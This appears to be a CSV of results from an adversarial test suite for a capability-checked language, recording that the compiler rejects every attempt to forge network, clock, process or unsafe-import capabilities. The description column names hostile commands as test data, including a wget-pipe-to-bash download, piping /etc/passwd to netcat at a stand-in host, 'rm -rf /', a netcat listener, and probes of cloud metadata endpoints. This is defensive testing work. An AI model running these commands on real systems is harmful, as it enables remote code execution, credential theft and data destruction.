category,attack_id,rejected,exit_code,rejection_reason,description
cat_net_punch,net_forge_connect_evil_example_com_443,True,1,C:\Users\nelso\AppData\Local\Temp\tmpwm6cav0y.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to evil.example.com:443 from a no-Net function.
cat_net_punch,net_helper_evil_example_com_443,True,1,C:\Users\nelso\AppData\Local\Temp\tmpjoml9hca.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt evil.example.com:443."
cat_net_punch,net_forge_connect_attacker-c2_invalid_8080,True,1,C:\Users\nelso\AppData\Local\Temp\tmpyw6xgafe.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to attacker-c2.invalid:8080 from a no-Net function.
cat_net_punch,net_helper_attacker-c2_invalid_8080,True,1,C:\Users\nelso\AppData\Local\Temp\tmpppl1p35q.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt attacker-c2.invalid:8080."
cat_net_punch,net_forge_connect_169_254_169_254_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmplkk8pojv.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to 169.254.169.254:80 from a no-Net function.
cat_net_punch,net_helper_169_254_169_254_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmpr8aih8ki.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt 169.254.169.254:80."
cat_net_punch,net_forge_connect_metadata_google_internal_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmp5n4sg4ge.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to metadata.google.internal:80 from a no-Net function.
cat_net_punch,net_helper_metadata_google_internal_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmpfciajqnv.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt metadata.google.internal:80."
cat_net_punch,net_forge_connect_10_0_0_1_22,True,1,C:\Users\nelso\AppData\Local\Temp\tmp0cn3ob3v.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to 10.0.0.1:22 from a no-Net function.
cat_net_punch,net_helper_10_0_0_1_22,True,1,C:\Users\nelso\AppData\Local\Temp\tmpsiiq_2ss.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt 10.0.0.1:22."
cat_net_punch,net_forge_connect_127_0_0_1_6379,True,1,C:\Users\nelso\AppData\Local\Temp\tmp3henzrmi.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to 127.0.0.1:6379 from a no-Net function.
cat_net_punch,net_helper_127_0_0_1_6379,True,1,C:\Users\nelso\AppData\Local\Temp\tmp8esbapg2.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt 127.0.0.1:6379."
cat_net_punch,net_forge_connect_169_254_169_254_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmpmh0jysqs.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to 169.254.169.254:80 from a no-Net function.
cat_net_punch,net_helper_169_254_169_254_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmpmftrku6x.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt 169.254.169.254:80."
cat_net_punch,net_forge_connect_burpcollaborator_net_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmp6w8i9urq.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Net and connect to burpcollaborator.net:80 from a no-Net function.
cat_net_punch,net_helper_burpcollaborator_net_80,True,1,C:\Users\nelso\AppData\Local\Temp\tmpo5h7ma1e.capa:2:15: error: capability 'Net' cannot be constructed at a call site; capabilities only flow through function parameters (declare net: Net on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Net in helper, attempt burpcollaborator.net:80."
cat_time_channel,clock_forge_now,True,1,C:\Users\nelso\AppData\Local\Temp\tmp1aa15t4q.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock and call clock.now() from no-Clock function.
cat_time_channel,clock_forge_monotonic,True,1,C:\Users\nelso\AppData\Local\Temp\tmp1kvwxw1p.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock and call clock.monotonic() from no-Clock function.
cat_time_channel,clock_forge_now_helper,True,1,C:\Users\nelso\AppData\Local\Temp\tmpx3jdarst.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock and call clock.now() from no-Clock function.
cat_time_channel,clock_forge_nested_call,True,1,C:\Users\nelso\AppData\Local\Temp\tmp_7__ogcg.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock and call clock.now() from no-Clock function.
cat_time_channel,clock_helper_0,True,1,C:\Users\nelso\AppData\Local\Temp\tmp4y6dcrvf.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock inside helper variant 0.
cat_time_channel,clock_helper_1,True,1,C:\Users\nelso\AppData\Local\Temp\tmp6txcaoco.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock inside helper variant 1.
cat_time_channel,clock_helper_2,True,1,C:\Users\nelso\AppData\Local\Temp\tmpfimcfn20.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock inside helper variant 2.
cat_time_channel,clock_helper_3,True,1,C:\Users\nelso\AppData\Local\Temp\tmpd0vkorrg.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock inside helper variant 3.
cat_time_channel,clock_helper_4,True,1,C:\Users\nelso\AppData\Local\Temp\tmpzilh2965.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock inside helper variant 4.
cat_time_channel,clock_helper_5,True,1,C:\Users\nelso\AppData\Local\Temp\tmp6yk8plpv.capa:2:17: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Clock inside helper variant 5.
cat_time_channel,clock_immediate_0,True,1,C:\Users\nelso\AppData\Local\Temp\tmprv_t_93g.capa:2:14: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Use Clock() expression result immediately (no let), variant 0."
cat_time_channel,clock_immediate_1,True,1,C:\Users\nelso\AppData\Local\Temp\tmp5lqrc50k.capa:2:14: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Use Clock() expression result immediately (no let), variant 1."
cat_time_channel,clock_immediate_2,True,1,C:\Users\nelso\AppData\Local\Temp\tmpte7crqek.capa:2:14: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Use Clock() expression result immediately (no let), variant 2."
cat_time_channel,clock_immediate_3,True,1,C:\Users\nelso\AppData\Local\Temp\tmp2phe6h0t.capa:2:14: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Use Clock() expression result immediately (no let), variant 3."
cat_time_channel,clock_immediate_4,True,1,C:\Users\nelso\AppData\Local\Temp\tmp10jq6sa6.capa:2:14: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Use Clock() expression result immediately (no let), variant 4."
cat_time_channel,clock_immediate_5,True,1,C:\Users\nelso\AppData\Local\Temp\tmpgtzv3sxt.capa:2:14: error: capability 'Clock' cannot be constructed at a call site; capabilities only flow through function parameters (declare clock: Clock on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Use Clock() expression result immediately (no let), variant 5."
cat_subprocess,proc_forge_direct_0,True,1,C:\Users\nelso\AppData\Local\Temp\tmpnxnqeyjl.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run 'curl evil.example.com'.
cat_subprocess,proc_forge_helper_0,True,1,C:\Users\nelso\AppData\Local\Temp\tmpzkvp9wad.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 0.
cat_subprocess,proc_forge_direct_1,True,1,C:\Users\nelso\AppData\Local\Temp\tmp5jr5foea.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run 'wget -O - http://attacker/sh | bash'.
cat_subprocess,proc_forge_helper_1,True,1,C:\Users\nelso\AppData\Local\Temp\tmp88h_2ajv.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 1.
cat_subprocess,proc_forge_direct_2,True,1,C:\Users\nelso\AppData\Local\Temp\tmp5ytyf_2k.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Proc and run ""sh -c 'cat /etc/passwd | nc evil.example""."
cat_subprocess,proc_forge_helper_2,True,1,C:\Users\nelso\AppData\Local\Temp\tmp6y2w8btm.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 2.
cat_subprocess,proc_forge_direct_3,True,1,C:\Users\nelso\AppData\Local\Temp\tmpgyctf68f.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run 'powershell -EncodedCommand AAAA'.
cat_subprocess,proc_forge_helper_3,True,1,C:\Users\nelso\AppData\Local\Temp\tmpzqrtaobk.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 3.
cat_subprocess,proc_forge_direct_4,True,1,C:\Users\nelso\AppData\Local\Temp\tmpw1ygy5jv.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run 'rm -rf /'.
cat_subprocess,proc_forge_helper_4,True,1,C:\Users\nelso\AppData\Local\Temp\tmpkqi3x1k6.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 4.
cat_subprocess,proc_forge_direct_5,True,1,C:\Users\nelso\AppData\Local\Temp\tmp1sr8ahx8.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,"Forge Proc and run 'python -c \'import os; os.system(""..."")\''."
cat_subprocess,proc_forge_helper_5,True,1,C:\Users\nelso\AppData\Local\Temp\tmpdos347_r.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 5.
cat_subprocess,proc_forge_direct_6,True,1,C:\Users\nelso\AppData\Local\Temp\tmpxvpjhss_.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run 'nc -l 4444'.
cat_subprocess,proc_forge_helper_6,True,1,C:\Users\nelso\AppData\Local\Temp\tmplont2o7b.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 6.
cat_subprocess,proc_forge_direct_7,True,1,C:\Users\nelso\AppData\Local\Temp\tmp16ulqg63.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run '/bin/bash'.
cat_subprocess,proc_forge_helper_7,True,1,C:\Users\nelso\AppData\Local\Temp\tmp7f4u9ofp.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 7.
cat_subprocess,proc_forge_direct_8,True,1,C:\Users\nelso\AppData\Local\Temp\tmp4so7__61.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run 'cmd /c whoami'.
cat_subprocess,proc_forge_helper_8,True,1,C:\Users\nelso\AppData\Local\Temp\tmpb9c0pqsy.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 8.
cat_subprocess,proc_forge_direct_9,True,1,C:\Users\nelso\AppData\Local\Temp\tmpu3wnp8u_.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc and run 'ssh root@10.0.0.1'.
cat_subprocess,proc_forge_helper_9,True,1,C:\Users\nelso\AppData\Local\Temp\tmptptgtqwf.capa:2:16: error: capability 'Proc' cannot be constructed at a call site; capabilities only flow through function parameters (declare proc: Proc on this function and let the caller pass it in). Constructing a capability locally would let any function silently obtain authority it never declared.,Forge Proc in helper variant 9.
cat_unsafe_smuggle,unsafe_py_import_os,True,1,"C:\Users\nelso\AppData\Local\Temp\tmpuqib5hkk.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('os') without Unsafe.
cat_unsafe_smuggle,unsafe_py_import_helper_os,True,1,"C:\Users\nelso\AppData\Local\Temp\tmpsr279zbg.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('os') inside a no-Unsafe helper.
cat_unsafe_smuggle,unsafe_py_import_subprocess,True,1,"C:\Users\nelso\AppData\Local\Temp\tmpww5a31ma.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('subprocess') without Unsafe.
cat_unsafe_smuggle,unsafe_py_import_helper_subprocess,True,1,"C:\Users\nelso\AppData\Local\Temp\tmpezgw61bp.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('subprocess') inside a no-Unsafe helper.
cat_unsafe_smuggle,unsafe_py_import_socket,True,1,"C:\Users\nelso\AppData\Local\Temp\tmpso10j9wv.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('socket') without Unsafe.
cat_unsafe_smuggle,unsafe_py_import_helper_socket,True,1,"C:\Users\nelso\AppData\Local\Temp\tmpl4gzd_9s.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('socket') inside a no-Unsafe helper.
cat_unsafe_smuggle,unsafe_py_import_shutil,True,1,"C:\Users\nelso\AppData\Local\Temp\tmp06pku5cv.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('shutil') without Unsafe.
cat_unsafe_smuggle,unsafe_py_import_helper_shutil,True,1,"C:\Users\nelso\AppData\Local\Temp\tmpxz91gq9q.capa:2:13: error: call to 'py_import': expected 2 arguments, got 1 (signature: fun(Unsafe, String) -> ?)",py_import('shutil') inside a no-Unsafe helper.
